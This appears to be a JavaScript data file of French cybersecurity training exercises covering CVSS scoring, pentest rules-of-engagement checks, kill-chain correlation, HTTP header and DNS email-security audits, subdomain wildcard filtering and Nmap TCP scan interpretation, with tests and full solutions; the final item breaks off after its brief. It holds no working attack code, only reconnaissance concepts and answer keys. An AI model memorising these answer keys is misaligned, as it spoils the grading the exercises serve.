'use strict';

module.exports = [
  {
    "id": "hk3-c1-e1",
    "chapter": 1,
    "title": "Calculateur de Score CVSS v3.1 Base Metrics",
    "level": "n1",
    "language": "analyse",
    "goal": "Calculer le sous-score d'exploitabilité, d'impact et le Base Score CVSS v3.1 d'une vulnérabilité avec sa sévérité.",
    "brief": "<p>Le standard CVSS v3.1 (Common Vulnerability Scoring System) quantifie la sévérité d'une faille de sécurité.<br><br>\nMétriques de base (Scope Unchanged 'U') :<br>\n- <code>AV</code> (Attack Vector) : Network (N)=0.85, Adjacent (A)=0.62, Local (L)=0.55, Physical (P)=0.20<br>\n- <code>AC</code> (Attack Complexity) : Low (L)=0.77, High (H)=0.44<br>\n- <code>PR</code> (Privileges Required) : None (N)=0.85, Low (L)=0.62, High (H)=0.27<br>\n- <code>UI</code> (User Interaction) : None (N)=0.85, Required (R)=0.62<br>\n- <code>C, I, A</code> (Confidentiality, Integrity, Availability) : None (N)=0.0, Low (L)=0.22, High (H)=0.56<br><br>\nFormules (Scope Unchanged) :<br>\n1. <code>Exploitability = 8.22 * AV * AC * PR * UI</code><br>\n2. <code>ISS = 1.0 - ((1.0 - C) * (1.0 - I) * (1.0 - A))</code><br>\n3. <code>Impact = 6.42 * ISS</code><br>\n4. Si <code>Impact &lt;= 0</code> : <code>BaseScore = 0.0</code><br>\n   Sinon : <code>BaseScore = min(10.0, math.ceil(round(Impact + Exploitability, 4) * 10) / 10.0)</code><br><br>\nSévérités CVSS v3.1 :<br>\n- <code>0.0</code> : <code>NONE</code><br>\n- <code>0.1 à 3.9</code> : <code>LOW</code><br>\n- <code>4.0 à 6.9</code> : <code>MEDIUM</code><br>\n- <code>7.0 à 8.9</code> : <code>HIGH</code><br>\n- <code>9.0 à 10.0</code> : <code>CRITICAL</code><br><br>\nDonnées du cas : <code>CVSS_CALC AV=&lt;N|A|L|P&gt; AC=&lt;L|H&gt; PR=&lt;N|L|H&gt; UI=&lt;N|R&gt; C=&lt;N|L|H&gt; I=&lt;N|L|H&gt; A=&lt;N|L|H&gt;</code>.<br>\nRésultat d’analyse attendu : <code>CVSS: exploitability=&lt;exp:.2f&gt; impact=&lt;imp:.2f&gt; base_score=&lt;score:.1f&gt; severity=&lt;sev&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c1-e1) — Calculateur de Score CVSS v3.1 Base Metrics\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Vulnérabilité locale avec interaction utilisateur et impact moyen]\n# Données : CVSS_CALC AV=L AC=L PR=N UI=R C=L I=L A=N\nA_COMPLETER\n\n[Cas 2 — Vulnérabilité réseau complexe nécessitant hauts privilèges]\n# Données : CVSS_CALC AV=N AC=H PR=H UI=N C=H I=N A=N\nA_COMPLETER\n\n[Cas 3 — Aucun impact de sécurité (Impact nul -> score 0.0)]\n# Données : CVSS_CALC AV=N AC=L PR=N UI=N C=N I=N A=N\nA_COMPLETER\n",
    "hints": [
      "Créez des dictionnaires pour les pondérations numériques de chaque métrique.",
      "Calculez ISS = 1.0 - ((1.0 - C) * (1.0 - I) * (1.0 - A)) puis Impact = 6.42 * ISS.",
      "Arrondissez au dixième supérieur : math.ceil(round(Impact + Exploitability, 4) * 10) / 10.0."
    ],
    "examples": [
      {
        "stdin": "CVSS_CALC AV=N AC=L PR=N UI=N C=H I=H A=H",
        "expected": "CVSS: exploitability=3.89 impact=5.87 base_score=9.8 severity=CRITICAL",
        "note": "RCE non-authentifiée à distance critique maximale (Impact et exploitabilité élevés)."
      }
    ],
    "tests": [
      {
        "label": "Vulnérabilité locale avec interaction utilisateur et impact moyen",
        "stdin": "cas:1",
        "expected": "CVSS: exploitability=1.83 impact=2.51 base_score=4.4 severity=MEDIUM"
      },
      {
        "label": "Vulnérabilité réseau complexe nécessitant hauts privilèges",
        "stdin": "cas:2",
        "expected": "CVSS: exploitability=0.71 impact=3.60 base_score=4.4 severity=MEDIUM"
      },
      {
        "label": "Aucun impact de sécurité (Impact nul -> score 0.0)",
        "stdin": "cas:3",
        "expected": "CVSS: exploitability=3.89 impact=0.00 base_score=0.0 severity=NONE"
      }
    ],
    "solution": "[Exemple]\nCVSS: exploitability=3.89 impact=5.87 base_score=9.8 severity=CRITICAL\n\n[Cas 1 — Vulnérabilité locale avec interaction utilisateur et impact moyen]\nCVSS: exploitability=1.83 impact=2.51 base_score=4.4 severity=MEDIUM\n\n[Cas 2 — Vulnérabilité réseau complexe nécessitant hauts privilèges]\nCVSS: exploitability=0.71 impact=3.60 base_score=4.4 severity=MEDIUM\n\n[Cas 3 — Aucun impact de sécurité (Impact nul -> score 0.0)]\nCVSS: exploitability=3.89 impact=0.00 base_score=0.0 severity=NONE"
  },
  {
    "id": "hk3-c1-e2",
    "chapter": 1,
    "title": "Validateur de Règles d'Engagement (RoE) et Périmètre d'Audit",
    "level": "n2",
    "language": "analyse",
    "goal": "Vérifier qu'une action d'audit de sécurité respecte le contrat de mandat de pentest (IP, ports, techniques interdites, créneau horaire).",
    "brief": "<p>Dans un test d'intrusion éthique, toute action en dehors des Règles d'Engagement (RoE) constitue une faute juridique grave (art. 323-1 du Code Pénal).<br><br>\nOpérations soumises à l’analyse :<br>\n1. <code>ROE_CONFIG target_ips=&lt;ip1,ip2,...&gt; allowed_ports=&lt;p1,p2,...&gt; forbidden_techniques=&lt;t1,t2,...&gt; window=&lt;start_h-end_h&gt;</code> : configure le périmètre.<br>\n2. <code>AUDIT_ACTION ip=&lt;ip&gt; port=&lt;p&gt; technique=&lt;tech&gt; hour=&lt;h&gt;</code> : soumet une action à validation.<br><br>\nRègles de validation (évaluées dans cet ordre précis) :<br>\n1. Si l'IP n'est pas dans <code>target_ips</code> : <code>DENIED: reason=OUT_OF_SCOPE_IP target=&lt;ip&gt;</code><br>\n2. Si le port n'est pas dans <code>allowed_ports</code> : <code>DENIED: reason=FORBIDDEN_PORT port=&lt;p&gt;</code><br>\n3. Si la technique est dans <code>forbidden_techniques</code> : <code>DENIED: reason=PROHIBITED_TECHNIQUE technique=&lt;tech&gt;</code><br>\n4. Si l'heure <code>h</code> est strictement hors créneau <code>start_h &lt;= h &lt;= end_h</code> : <code>DENIED: reason=OUTSIDE_TIME_WINDOW hour=&lt;h&gt;</code><br>\n5. Sinon : <code>PERMITTED: target=&lt;ip&gt;:&lt;p&gt; technique=&lt;tech&gt; status=AUTHORIZED</code></p>",
    "starter": "# Grille d'analyse (hk3-c1-e2) — Validateur de Règles d'Engagement (RoE) et Périmètre d'Audit\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Rejet IP hors périmètre (Out of scope)]\n# Données : ROE_CONFIG target_ips=10.0.0.5 allowed_ports=80,443 forbidden_techniques=DOS window=09-17\n# Données : AUDIT_ACTION ip=10.0.0.99 port=80 technique=DIR_BRUTEFORCE hour=10\nA_COMPLETER\n\n[Cas 2 — Rejet technique prohibée par le mandat (Déni de service)]\n# Données : ROE_CONFIG target_ips=172.16.0.10 allowed_ports=80,443 forbidden_techniques=DOS,EXPLOIT_BRUTEFORCE window=08-20\n# Données : AUDIT_ACTION ip=172.16.0.10 port=80 technique=DOS hour=11\nA_COMPLETER\n\n[Cas 3 — Rejet action exécutée en dehors de la fenêtre horaire convenue]\n# Données : ROE_CONFIG target_ips=192.168.10.50 allowed_ports=22,80 forbidden_techniques=EXPLOIT_UNAPPROVED window=20-23\n# Données : AUDIT_ACTION ip=192.168.10.50 port=22 technique=SSH_AUDIT hour=15\nA_COMPLETER\n",
    "hints": [
      "Stockez target_ips, allowed_ports et forbidden_techniques sous forme d'ensembles (set) pour des tests efficaces.",
      "Découpez window sur le tiret pour obtenir start_h et end_h convertis en int.",
      "Validez les conditions séquentiellement dès qu'une règle de sécurité est violée."
    ],
    "examples": [
      {
        "stdin": "ROE_CONFIG target_ips=192.168.1.10,192.168.1.20 allowed_ports=80,443,22 forbidden_techniques=DOS,SOCIAL_ENG window=08-18\nAUDIT_ACTION ip=192.168.1.10 port=443 technique=PORT_SCAN hour=14",
        "expected": "PERMITTED: target=192.168.1.10:443 technique=PORT_SCAN status=AUTHORIZED",
        "note": "Action autorisée dans le périmètre et pendant le créneau contractuel."
      }
    ],
    "tests": [
      {
        "label": "Rejet IP hors périmètre (Out of scope)",
        "stdin": "cas:1",
        "expected": "DENIED: reason=OUT_OF_SCOPE_IP target=10.0.0.99"
      },
      {
        "label": "Rejet technique prohibée par le mandat (Déni de service)",
        "stdin": "cas:2",
        "expected": "DENIED: reason=PROHIBITED_TECHNIQUE technique=DOS"
      },
      {
        "label": "Rejet action exécutée en dehors de la fenêtre horaire convenue",
        "stdin": "cas:3",
        "expected": "DENIED: reason=OUTSIDE_TIME_WINDOW hour=15"
      }
    ],
    "solution": "[Exemple]\nPERMITTED: target=192.168.1.10:443 technique=PORT_SCAN status=AUTHORIZED\n\n[Cas 1 — Rejet IP hors périmètre (Out of scope)]\nDENIED: reason=OUT_OF_SCOPE_IP target=10.0.0.99\n\n[Cas 2 — Rejet technique prohibée par le mandat (Déni de service)]\nDENIED: reason=PROHIBITED_TECHNIQUE technique=DOS\n\n[Cas 3 — Rejet action exécutée en dehors de la fenêtre horaire convenue]\nDENIED: reason=OUTSIDE_TIME_WINDOW hour=15"
  },
  {
    "id": "hk3-c1-e3",
    "chapter": 1,
    "title": "Moteur de Corrélation Cyber Kill Chain & Détection d'Attaque",
    "level": "n3",
    "language": "analyse",
    "goal": "Analyser une séquence d'événements de sécurité, reconstituer les phases de la Cyber Kill Chain et évaluer la complétude de l'intrusion.",
    "brief": "<p>Le modèle Cyber Kill Chain (Lockheed Martin) formalise les étapes successives d'une cyberattaque ciblée (APT) :<br>\n1. <code>RECON</code> (Reconnaissance)<br>\n2. <code>WEAPON</code> (Weaponization)<br>\n3. <code>DELIVERY</code> (Delivery)<br>\n4. <code>EXPLOIT</code> (Exploitation)<br>\n5. <code>INSTALL</code> (Installation / Persistance)<br>\n6. <code>C2</code> (Command & Control)<br>\n7. <code>ACTIONS</code> (Actions on Objectives / Exfiltration)<br><br>\nDonnées du cas : <code>KILLCHAIN_EVAL events=&lt;e1:p1,e2:p2,...&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n<code>KILLCHAIN: total_events=&lt;N&gt; phases_identified=&lt;count&gt;/7 highest_phase=&lt;phase&gt; coverage_pct=&lt;pct&gt;% status=&lt;COMPLETE_KILL_CHAIN|PARTIAL_ATTACK&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c1-e3) — Moteur de Corrélation Cyber Kill Chain & Détection d'Attaque\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Attaque stoppée à la phase d'exploitation]\n# Données : KILLCHAIN_EVAL events=osint_scan:RECON,spear_phish:DELIVERY,buffer_overflow:EXPLOIT\nA_COMPLETER\n\n[Cas 2 — Événements répétés sur phases initiales de reconnaissance]\n# Données : KILLCHAIN_EVAL events=shodan_query:RECON,subdomain_fuzz:RECON,port_scan:RECON\nA_COMPLETER\n\n[Cas 3 — Attaque atteignant le canal de commande et contrôle C2]\n# Données : KILLCHAIN_EVAL events=nmap_scan:RECON,malicious_pdf:DELIVERY,cve_exploit:EXPLOIT,reverse_shell:C2\nA_COMPLETER\n",
    "hints": [
      "Le modèle Cyber Kill Chain de Lockheed Martin décompose une cyberattaque en 7 phases séquentielles strictes.",
      "Analysez les preuves d’activité pour déterminer la phase la plus avancée atteinte par l’attaquant et évaluer la couverture de l’attaque."
    ],
    "examples": [
      {
        "stdin": "KILLCHAIN_EVAL events=dns_whois:RECON,craft_doc:WEAPON,phish_mail:DELIVERY,macro_run:EXPLOIT,reg_persist:INSTALL,beacon_http:C2,db_dump:ACTIONS",
        "expected": "KILLCHAIN: total_events=7 phases_identified=7/7 highest_phase=ACTIONS coverage_pct=100% status=COMPLETE_KILL_CHAIN",
        "note": "Attaque complète ayant franchi les 7 étapes jusqu'à l'exfiltration."
      }
    ],
    "tests": [
      {
        "label": "Attaque stoppée à la phase d'exploitation",
        "stdin": "cas:1",
        "expected": "KILLCHAIN: total_events=3 phases_identified=3/7 highest_phase=EXPLOIT coverage_pct=42% status=PARTIAL_ATTACK"
      },
      {
        "label": "Événements répétés sur phases initiales de reconnaissance",
        "stdin": "cas:2",
        "expected": "KILLCHAIN: total_events=3 phases_identified=1/7 highest_phase=RECON coverage_pct=14% status=PARTIAL_ATTACK"
      },
      {
        "label": "Attaque atteignant le canal de commande et contrôle C2",
        "stdin": "cas:3",
        "expected": "KILLCHAIN: total_events=4 phases_identified=4/7 highest_phase=C2 coverage_pct=57% status=PARTIAL_ATTACK"
      }
    ],
    "solution": "[Exemple]\nKILLCHAIN: total_events=7 phases_identified=7/7 highest_phase=ACTIONS coverage_pct=100% status=COMPLETE_KILL_CHAIN\n\n[Cas 1 — Attaque stoppée à la phase d'exploitation]\nKILLCHAIN: total_events=3 phases_identified=3/7 highest_phase=EXPLOIT coverage_pct=42% status=PARTIAL_ATTACK\n\n[Cas 2 — Événements répétés sur phases initiales de reconnaissance]\nKILLCHAIN: total_events=3 phases_identified=1/7 highest_phase=RECON coverage_pct=14% status=PARTIAL_ATTACK\n\n[Cas 3 — Attaque atteignant le canal de commande et contrôle C2]\nKILLCHAIN: total_events=4 phases_identified=4/7 highest_phase=C2 coverage_pct=57% status=PARTIAL_ATTACK"
  },
  {
    "id": "hk3-c2-e1",
    "chapter": 2,
    "title": "Analyseur d'En-têtes HTTP de Sécurité et Détection de Fuite d'Information",
    "level": "n1",
    "language": "analyse",
    "goal": "Auditer les en-têtes HTTP de sécurité d'un serveur et détecter la divulgation de bannières technologiques.",
    "brief": "<p>La reconnaissance passive d'une cible web commence par l'analyse des en-têtes HTTP renvoyés.<br><br>\nRègles d'évaluation (Score initial = 100) :<br>\n- <code>Strict-Transport-Security</code> (HSTS) : requis. Si absent : -30 points et problème <code>MISSING_HSTS</code>.<br>\n- <code>Content-Security-Policy</code> (CSP) : requis. Si absent : -35 points et problème <code>MISSING_CSP</code>.<br>\n- <code>X-Frame-Options</code> : requis (valeur <code>DENY</code> ou <code>SAMEORIGIN</code>). Si absent ou valeur incorrecte : -20 points et problème <code>MISSING_X_FRAME_OPTIONS</code>.<br>\n- <code>Server</code> ou <code>X-Powered-By</code> : divulguent la pile technologique. Si au moins l'un est présent : -15 points et problème <code>INFO_DISCLOSURE</code>.<br><br>\nAttribution du grade :<br>\n- Score 100 : Grade <code>A</code><br>\n- Score 70 à 99 : Grade <code>B</code><br>\n- Score 50 à 69 : Grade <code>C</code><br>\n- Score &lt; 50 : Grade <code>F</code><br><br>\nDonnées du cas : <code>AUDIT_HEADERS headers=&lt;H1:V1;H2:V2;...&gt;</code>.<br>\nRésultat d’analyse attendu : <code>HTTP_AUDIT: score=&lt;score&gt;/100 grade=&lt;grade&gt; issues=&lt;issue1,issue2,...|NONE&gt;</code> (problèmes séparés par des virgules dans l'ordre HSTS, CSP, XFO, INFO).</p>",
    "starter": "# Grille d'analyse (hk3-c2-e1) — Analyseur d'En-têtes HTTP de Sécurité et Détection de Fuite d'Information\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Serveur exposant sa version Apache sans CSP ni HSTS]\n# Données : AUDIT_HEADERS headers=Server:Apache/2.4.41 (Ubuntu);X-Frame-Options:SAMEORIGIN\nA_COMPLETER\n\n[Cas 2 — Serveur moderne sécurisé avec fuite d'en-tête PHP X-Powered-By]\n# Données : AUDIT_HEADERS headers=Strict-Transport-Security:max-age=63072000;Content-Security-Policy:default-src self;X-Frame-Options:DENY;X-Powered-By:PHP/8.2.1\nA_COMPLETER\n\n[Cas 3 — En-têtes quasi vides révélant vulnérabilité au Clickjacking]\n# Données : AUDIT_HEADERS headers=Content-Type:text/html\nA_COMPLETER\n",
    "hints": [
      "Normalisez les noms d'en-têtes en minuscules pour faciliter les comparaisons insensibles à la casse.",
      "Vérifiez la présence de strict-transport-security, content-security-policy et x-frame-options.",
      "Si server ou x-powered-by est dans les en-têtes, ajoutez INFO_DISCLOSURE."
    ],
    "examples": [
      {
        "stdin": "AUDIT_HEADERS headers=Strict-Transport-Security:max-age=31536000;Content-Security-Policy:default-src https:;X-Frame-Options:DENY",
        "expected": "HTTP_AUDIT: score=100/100 grade=A issues=NONE",
        "note": "Tous les en-têtes de sécurité recommandés sont présents sans fuite de version."
      }
    ],
    "tests": [
      {
        "label": "Serveur exposant sa version Apache sans CSP ni HSTS",
        "stdin": "cas:1",
        "expected": "HTTP_AUDIT: score=20/100 grade=F issues=MISSING_HSTS,MISSING_CSP,INFO_DISCLOSURE"
      },
      {
        "label": "Serveur moderne sécurisé avec fuite d'en-tête PHP X-Powered-By",
        "stdin": "cas:2",
        "expected": "HTTP_AUDIT: score=85/100 grade=B issues=INFO_DISCLOSURE"
      },
      {
        "label": "En-têtes quasi vides révélant vulnérabilité au Clickjacking",
        "stdin": "cas:3",
        "expected": "HTTP_AUDIT: score=15/100 grade=F issues=MISSING_HSTS,MISSING_CSP,MISSING_X_FRAME_OPTIONS"
      }
    ],
    "solution": "[Exemple]\nHTTP_AUDIT: score=100/100 grade=A issues=NONE\n\n[Cas 1 — Serveur exposant sa version Apache sans CSP ni HSTS]\nHTTP_AUDIT: score=20/100 grade=F issues=MISSING_HSTS,MISSING_CSP,INFO_DISCLOSURE\n\n[Cas 2 — Serveur moderne sécurisé avec fuite d'en-tête PHP X-Powered-By]\nHTTP_AUDIT: score=85/100 grade=B issues=INFO_DISCLOSURE\n\n[Cas 3 — En-têtes quasi vides révélant vulnérabilité au Clickjacking]\nHTTP_AUDIT: score=15/100 grade=F issues=MISSING_HSTS,MISSING_CSP,MISSING_X_FRAME_OPTIONS"
  },
  {
    "id": "hk3-c2-e2",
    "chapter": 2,
    "title": "Extracteur et Filtre d'Empreintes DNS (SPF, DMARC & AXFR)",
    "level": "n2",
    "language": "analyse",
    "goal": "Analyser les enregistrements DNS d'un domaine pour détecter les risques d'usurpation d'email et de fuite par transfert de zone.",
    "brief": "<p>L'énumération DNS révèle les mécanismes de protection contre l'usurpation (Spoofing) et les mauvaises configurations de serveurs de noms.<br><br>\nRègles d'audit :<br>\n1. <code>AXFR (Zone Transfer)</code> :<br>\n   - Si <code>axfr_status == ALLOWED</code> : <code>axfr=VULNERABLE_LEAK</code>, risque immédiat <code>CRITICAL</code>.<br>\n   - Si <code>axfr_status == REFUSED</code> : <code>axfr=SECURE</code>.<br>\n2. <code>SPF (Sender Policy Framework)</code> :<br>\n   - Chercher un enregistrement TXT débutant par <code>v=spf1</code>.<br>\n   - Si absent : <code>spf=MISSING</code>.<br>\n   - Si se termine par <code>+all</code> ou <code>?all</code> : <code>spf=PERMISSIVE</code>.<br>\n   - Si se termine par <code>~all</code> : <code>spf=SOFTFAIL</code>.<br>\n   - Si se termine par <code>-all</code> : <code>spf=HARDFAIL_SECURE</code>.<br>\n3. <code>DMARC</code> :<br>\n   - Chercher un enregistrement TXT débutant par <code>v=DMARC1</code>.<br>\n   - Si absent : <code>dmarc=MISSING</code>.<br>\n   - Si contient <code>p=none</code> : <code>dmarc=POLICY_NONE</code>.<br>\n   - Si contient <code>p=quarantine</code> ou <code>p=reject</code> : <code>dmarc=ENFORCED_SECURE</code>.<br><br>\nÉvaluation du niveau de risque global :<br>\n- <code>CRITICAL</code> : si <code>axfr == VULNERABLE_LEAK</code>.<br>\n- <code>HIGH</code> : sinon, si <code>spf in ('MISSING', 'PERMISSIVE')</code> et <code>dmarc in ('MISSING', 'POLICY_NONE')</code>.<br>\n- <code>MEDIUM</code> : sinon, si <code>spf == 'SOFTFAIL'</code> ou <code>dmarc in ('MISSING', 'POLICY_NONE')</code>.<br>\n- <code>LOW</code> : sinon (SPF HARDFAIL_SECURE et DMARC ENFORCED_SECURE avec AXFR SECURE).<br><br>\nDonnées du cas : <code>DNS_AUDIT domain=&lt;dom&gt; axfr=&lt;ALLOWED|REFUSED&gt; records=&lt;r1;r2;...&gt;</code>.<br>\nRésultat d’analyse attendu : <code>DNS_REPORT: domain=&lt;dom&gt; spf=&lt;s&gt; dmarc=&lt;d&gt; axfr=&lt;a&gt; risk=&lt;r&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c2-e2) — Extracteur et Filtre d'Empreintes DNS (SPF, DMARC & AXFR)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Fuite critique de l'ensemble de la zone DNS via AXFR autorisé]\n# Données : DNS_AUDIT domain=vuln-bank.com axfr=ALLOWED records=v=spf1 -all;v=DMARC1; p=reject\nA_COMPLETER\n\n[Cas 2 — Risque élevé d'usurpation avec absence totale de SPF et DMARC]\n# Données : DNS_AUDIT domain=legacy-shop.org axfr=REFUSED records=google-site-verification=xyz\nA_COMPLETER\n\n[Cas 3 — Risque moyen avec politique DMARC en simple surveillance (p=none)]\n# Données : DNS_AUDIT domain=startup.io axfr=REFUSED records=v=spf1 include:_spf.google.com ~all;v=DMARC1; p=none; rua=mailto:reports@startup.io\nA_COMPLETER\n",
    "hints": [
      "Isolez les enregistrements contenant v=spf1 et v=DMARC1.",
      "Vérifiez la terminaison du SPF (+all, ?all, ~all, -all).",
      "Appliquez la hiérarchie de risque CRITICAL -> HIGH -> MEDIUM -> LOW."
    ],
    "examples": [
      {
        "stdin": "DNS_AUDIT domain=target-corp.fr axfr=REFUSED records=v=spf1 mx ip4:192.168.1.1 -all;v=DMARC1; p=reject; rua=mailto:dmarc@target-corp.fr",
        "expected": "DNS_REPORT: domain=target-corp.fr spf=HARDFAIL_SECURE dmarc=ENFORCED_SECURE axfr=SECURE risk=LOW",
        "note": "Domaine parfaitement protégé contre l'usurpation et le transfert de zone."
      }
    ],
    "tests": [
      {
        "label": "Fuite critique de l'ensemble de la zone DNS via AXFR autorisé",
        "stdin": "cas:1",
        "expected": "DNS_REPORT: domain=vuln-bank.com spf=HARDFAIL_SECURE dmarc=ENFORCED_SECURE axfr=VULNERABLE_LEAK risk=CRITICAL"
      },
      {
        "label": "Risque élevé d'usurpation avec absence totale de SPF et DMARC",
        "stdin": "cas:2",
        "expected": "DNS_REPORT: domain=legacy-shop.org spf=MISSING dmarc=MISSING axfr=SECURE risk=HIGH"
      },
      {
        "label": "Risque moyen avec politique DMARC en simple surveillance (p=none)",
        "stdin": "cas:3",
        "expected": "DNS_REPORT: domain=startup.io spf=SOFTFAIL dmarc=POLICY_NONE axfr=SECURE risk=MEDIUM"
      }
    ],
    "solution": "[Exemple]\nDNS_REPORT: domain=target-corp.fr spf=HARDFAIL_SECURE dmarc=ENFORCED_SECURE axfr=SECURE risk=LOW\n\n[Cas 1 — Fuite critique de l'ensemble de la zone DNS via AXFR autorisé]\nDNS_REPORT: domain=vuln-bank.com spf=HARDFAIL_SECURE dmarc=ENFORCED_SECURE axfr=VULNERABLE_LEAK risk=CRITICAL\n\n[Cas 2 — Risque élevé d'usurpation avec absence totale de SPF et DMARC]\nDNS_REPORT: domain=legacy-shop.org spf=MISSING dmarc=MISSING axfr=SECURE risk=HIGH\n\n[Cas 3 — Risque moyen avec politique DMARC en simple surveillance (p=none)]\nDNS_REPORT: domain=startup.io spf=SOFTFAIL dmarc=POLICY_NONE axfr=SECURE risk=MEDIUM"
  },
  {
    "id": "hk3-c2-e3",
    "chapter": 2,
    "title": "Moteur de Découverte de Sous-Domaines par Fuzzing et Filtrage Wildcard",
    "level": "n3",
    "language": "analyse",
    "goal": "Identifier les sous-domaines légitimes actifs en éliminant les faux positifs causés par les DNS wildcards.",
    "brief": "<p>Lors de l'énumération par dictionnaire (subdomain brute-forcing), une réponse wildcard DNS redirige tous les sous-domaines inexistants vers une IP par défaut, générant des milliers de faux positifs.<br><br>\nAlgorithme de filtrage :<br>\n1. Si <code>wildcard_ip != 'NONE'</code>, toute entrée dont l'IP correspond à <code>wildcard_ip</code> est classée comme faux positif wildcard.<br>\n2. Les entrées dont l'IP diffère de <code>wildcard_ip</code> sont des sous-domaines actifs validés.<br>\n3. Les sous-domaines valides sont ordonnés alphabétiquement sous la forme <code>&lt;sub&gt;.&lt;domain&gt;</code>.<br><br>\nDonnées du cas : <code>SUBDOMAIN_FUZZ domain=&lt;dom&gt; wildcard_ip=&lt;ip|NONE&gt; responses=&lt;sub1:ip1,sub2:ip2,...&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n<code>SUBDOMAINS: domain=&lt;dom&gt; total_scanned=&lt;N&gt; wildcards_filtered=&lt;W&gt; valid_found=&lt;V&gt; active=&lt;s1.dom,s2.dom|NONE&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c2-e3) — Moteur de Découverte de Sous-Domaines par Fuzzing et Filtrage Wildcard\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Aucun wildcard configuré sur le domaine cible]\n# Données : SUBDOMAIN_FUZZ domain=corp.org wildcard_ip=NONE responses=vpn:10.0.0.1,api:10.0.0.2\nA_COMPLETER\n\n[Cas 2 — Toutes les réponses sont des faux positifs vers le wildcard]\n# Données : SUBDOMAIN_FUZZ domain=wildcard-all.net wildcard_ip=172.16.0.50 responses=a:172.16.0.50,b:172.16.0.50,c:172.16.0.50\nA_COMPLETER\n\n[Cas 3 — Multiples sous-domaines valides ordonnés alphabétiquement]\n# Données : SUBDOMAIN_FUZZ domain=cloud.dev wildcard_ip=1.1.1.1 responses=gitlab:10.1.1.5,bogus:1.1.1.1,auth:10.1.1.2,monitor:10.1.1.9\nA_COMPLETER\n",
    "hints": [
      "Parcourez chaque couple sub:ip dans responses.",
      "Si wildcard_ip != \"NONE\" et ip == wildcard_ip, incrémentez wildcards_filtered.",
      "Triez la liste des sous-domaines valides alphabétiquement avant l'affichage."
    ],
    "examples": [
      {
        "stdin": "SUBDOMAIN_FUZZ domain=example.com wildcard_ip=192.168.1.100 responses=admin:192.168.1.5,fake99:192.168.1.100,mail:192.168.1.6,testabc:192.168.1.100",
        "expected": "SUBDOMAINS: domain=example.com total_scanned=4 wildcards_filtered=2 valid_found=2 active=admin.example.com,mail.example.com",
        "note": "Les deux sous-domaines aléatoires pointant vers l'IP wildcard sont éliminés."
      }
    ],
    "tests": [
      {
        "label": "Aucun wildcard configuré sur le domaine cible",
        "stdin": "cas:1",
        "expected": "SUBDOMAINS: domain=corp.org total_scanned=2 wildcards_filtered=0 valid_found=2 active=api.corp.org,vpn.corp.org"
      },
      {
        "label": "Toutes les réponses sont des faux positifs vers le wildcard",
        "stdin": "cas:2",
        "expected": "SUBDOMAINS: domain=wildcard-all.net total_scanned=3 wildcards_filtered=3 valid_found=0 active=NONE"
      },
      {
        "label": "Multiples sous-domaines valides ordonnés alphabétiquement",
        "stdin": "cas:3",
        "expected": "SUBDOMAINS: domain=cloud.dev total_scanned=4 wildcards_filtered=1 valid_found=3 active=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev"
      }
    ],
    "solution": "[Exemple]\nSUBDOMAINS: domain=example.com total_scanned=4 wildcards_filtered=2 valid_found=2 active=admin.example.com,mail.example.com\n\n[Cas 1 — Aucun wildcard configuré sur le domaine cible]\nSUBDOMAINS: domain=corp.org total_scanned=2 wildcards_filtered=0 valid_found=2 active=api.corp.org,vpn.corp.org\n\n[Cas 2 — Toutes les réponses sont des faux positifs vers le wildcard]\nSUBDOMAINS: domain=wildcard-all.net total_scanned=3 wildcards_filtered=3 valid_found=0 active=NONE\n\n[Cas 3 — Multiples sous-domaines valides ordonnés alphabétiquement]\nSUBDOMAINS: domain=cloud.dev total_scanned=4 wildcards_filtered=1 valid_found=3 active=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev"
  },
  {
    "id": "hk3-c3-e1",
    "chapter": 3,
    "title": "Interpréteur de Drapeaux TCP et Diagnostic de Sondes de Scan",
    "level": "n1",
    "language": "analyse",
    "goal": "Analyser les paquets de réponse TCP pour déterminer l'état d'un port selon la RFC 793 et le type de scan Nmap.",
    "brief": "<p>Nmap utilise différents types de sondes TCP pour sonder l'état des ports et cartographier les pare-feux :<br><br>\nRègles de diagnostic selon le scan et la réponse reçue :<br>\n1. <code>SYN</code> (SYN Stealth scan <code>-sS</code>) :<br>\n   - Réponse <code>SYN+ACK</code> : <code>state=OPEN</code><br>\n   - Réponse <code>RST</code> ou <code>RST+ACK</code> : <code>state=CLOSED</code><br>\n   - Réponse <code>TIMEOUT</code> : <code>state=FILTERED</code><br>\n2. <code>FIN</code>, <code>NULL</code>, <code>XMAS</code> (scans furtifs inverses) :<br>\n   - Réponse <code>RST</code> : <code>state=CLOSED</code><br>\n   - Réponse <code>TIMEOUT</code> : <code>state=OPEN|FILTERED</code><br>\n3. <code>ACK</code> (Window/Firewall scan <code>-sA</code>) :<br>\n   - Réponse <code>RST</code> : <code>state=UNFILTERED</code><br>\n   - Réponse <code>TIMEOUT</code> : <code>state=FILTERED</code><br><br>\nDonnées du cas : <code>TCP_PROBE scan_type=&lt;SYN|FIN|NULL|XMAS|ACK&gt; port=&lt;p&gt; reply=&lt;SYN+ACK|RST|TIMEOUT|RST+ACK&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PORT_STATE: port=&lt;p&gt; scan_type=&lt;type&gt; reply=&lt;reply&gt; state=&lt;state&gt;</code>.</p>",
